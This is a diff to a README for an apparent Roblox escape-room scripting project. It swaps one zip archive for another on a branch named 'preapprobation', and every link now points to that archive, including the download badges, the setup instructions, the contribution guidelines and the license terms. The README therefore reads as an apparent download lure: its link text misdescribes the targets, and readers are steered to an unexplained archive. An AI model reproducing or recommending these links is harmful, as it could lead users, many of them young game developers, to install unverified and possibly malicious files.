@@ -84,9 +84,9 @@ Our contributors imagine escape rooms not as locked boxes, but as ongoing conver
 Looking to unlock the next puzzle piece?  
 Click below to download the latest release:
 
-[![Download](https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-room-roblox-scripting-lab_v3.5.zip)](https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-room-roblox-scripting-lab_v3.5.zip)
+[![Download](https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-lab-scripting-roblox-room-v1.2.zip)](https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-lab-scripting-roblox-room-v1.2.zip)
 
-- Unzip the archive and follow the `https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-room-roblox-scripting-lab_v3.5.zip` instructions for seamless integration into your Roblox project.
+- Unzip the archive and follow the `https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-lab-scripting-roblox-room-v1.2.zip` instructions for seamless integration into your Roblox project.
 - Need offline docs or the template room? Both are included in the download!
 
 ---
@@ -117,7 +117,7 @@ Roblox is a trademark of Roblox Corporation. This repository is not affiliated w
 
 Shape the cryptic corridors of tomorrow’s escape rooms!  
 - Fork, star, or submit pull requests—your puzzle logic, new translations, and innovative features are always welcome.
-- Please see `https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-room-roblox-scripting-lab_v3.5.zip` for etiquette and guidelines.
+- Please see `https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-lab-scripting-roblox-room-v1.2.zip` for etiquette and guidelines.
 
 ---
 
@@ -126,7 +126,7 @@ Shape the cryptic corridors of tomorrow’s escape rooms!
 Unlock limitless creativity, with no padlocks on your code.  
 This project is licensed under the MIT License.
 
-[View the license terms here.](https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-room-roblox-scripting-lab_v3.5.zip)
+[View the license terms here.](https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-lab-scripting-roblox-room-v1.2.zip)
 
 ---
 
@@ -134,7 +134,7 @@ This project is licensed under the MIT License.
 
 Did you puzzle your way down here? Here's that key again:
 
-[![Download](https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-room-roblox-scripting-lab_v3.5.zip)](https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-room-roblox-scripting-lab_v3.5.zip)
+[![Download](https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-lab-scripting-roblox-room-v1.2.zip)](https://raw.githubusercontent.com/hakemiabdul/escape-room-roblox-scripting-lab/branch/preapprobation/escape-lab-scripting-roblox-room-v1.2.zip)
 
 ---
 
